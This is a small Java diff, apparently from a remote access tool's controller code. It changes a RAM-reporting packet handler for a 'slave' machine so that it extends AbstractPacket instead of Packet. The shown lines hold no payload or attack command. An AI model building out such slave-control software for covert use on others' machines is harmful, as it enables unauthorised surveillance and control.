@@ -5,7 +5,7 @@ import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlSystemMonitor;
 import com.redpois0n.utils.Util;
 
-public class PacketHERERAM extends Packet {
+public class PacketHERERAM extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
